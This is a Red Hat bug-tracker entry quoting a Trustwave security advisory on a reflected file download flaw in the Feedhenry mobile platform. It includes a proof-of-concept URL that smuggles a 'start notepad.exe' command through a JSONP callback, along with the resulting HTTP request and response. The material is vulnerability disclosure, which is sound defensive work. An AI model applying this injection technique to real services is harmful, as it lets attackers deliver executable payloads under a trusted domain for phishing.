| [Description](show_bug.cgi?id=1272326#c0)  Trevor Jay    2015-10-16 06:36:03 UTC  ``` A vulnerability was discovered in the Red Hat Mobile platform allowing a malicious attacker to utilize service for a reflected download attack.  An attacker can craft a URL pointing to a file of their choosing that will, in certain browsers, appear to be downloaded from the Red Hat Mobile platform itself. Such a URL could be used in---for example---a spoof or spear-phishing e-mail to capitalize on user trust.  Acknowledgements:  Red Hat would like to thank Maciej Grela of Trustwave for reporting this issue.   ```  [Comment 1](show_bug.cgi?id=1272326#c1)  Trevor Jay    2015-10-16 06:40:46 UTC  ``` The original report follows:  Trustwave SpiderLabs Security Advisory: Reflected File Download in RedHat Feedhenry  Vendor: RedHat Inc. (<http://www.redhat.com/>) [Open URL] Product: Feedhenry Enterprise Mobile Application Platform Version affected: n/a  Product description: Mobile Platform for Enterprise. Accelerate collaboration & development on Mobile Projects.  Finding 1: Reflected File Download in RedHat Feedhenry *****Credit: Maciej Grela of Trustwave  A particular request used by the Feedhenry mobile app hosting platform is vulnerable to Reflected File Download [1] in certain browsers. Consider the following URL:  <https://example.feedhenry.com/box/srv/1.1/app/init/install.cmd?_callback=start%20notepad.exe%0d%0a&amp;_jsonpdata>= [Open URL]{%22appid%22:%22<application_id>%22,%22appkey%22:%22<application_key>%22}  A similar URL is used by the application code at initialization, the above was significantly optimized. Please note, that the appid and appkey values need to be valid. Fetching this URL results in the following request/response pair:  8<------------------------------------------------ GET /box/srv/1.1/app/init/install.cmd?_callback=start%20notepad.exe%0d%0a&_jsonpdata={%22appid%22:%22<application_id>%22,%22appkey%22:%22<application_key>%22} HTTP/1.1 Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */* Accept-Language: en-us User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C) Accept-Encoding: gzip, deflate                                                                                                                                                                                                                Proxy-Connection: Keep-Alive                                                                                                                                                                                                                  Host: example.feedhenry.com  8<------------------------------------------------  Response:  8<------------------------------------------------ HTTP/1.1 200 OK Date: Mon, 30 Mar 2015 13:01:28 GMT Expires: Sat, 6 May 1995 12:00:00 GMT Cache-Control: no-store, no-cache, must-revalidate P3P: CP="ALL ADM DEV PSAi COM OUR OTRo STP IND ONL" policyref="/box/p3p.xml" Pragma: no-cache Cache-Control: post-check=0, pre-check=0 Last-Modified: Mon, 30 Mar 2015 13:01:28 GMT ETag: "<etag>" Content-Type: text/javascript;charset=UTF-8 Vary: Accept-Encoding Content-Length: 392  start notepad.exe ({"apptitle":"Fake App","domain":"example","firstTime":false,"hosts":{"debugCloudType":"node","debugCloudUrl":"<https://debug-url.feedhenry.net> [Open URL]","releaseCloudType":"node","releaseCloudUrl":"<https://release-url.feedhenry.net> [Open URL]"},"init":{"trackId":"<track_id>"},"status":"ok"}); 8<------------------------------------------------  This kind of response result in a response that will be interpreted by certain browsers (IE8 on Windows 7 [3] was tested as a proof of concept) as an apparent file download from the example.feedhenry.com domain with both the file name (install.cmd) and contents controlled by the attacker. This allows to execute arbitrary code when the victim launches the downloaded file.  This is just a very simple proof of concept, please refer to the BlackHat 2014 talk [2] and TW Spiderlabs blog [1] for more details about this vulnerability and ways to mitigate it.

Users must be tricked into downloading and running the payload and the browser compatibility is limited. It cannot be used to directly attack users or compromise an application.  I am closing this vulnerability WONTFIX. This BZ exist to track the CVE should it be incidentally fixed in a rebase.   ``` |  |
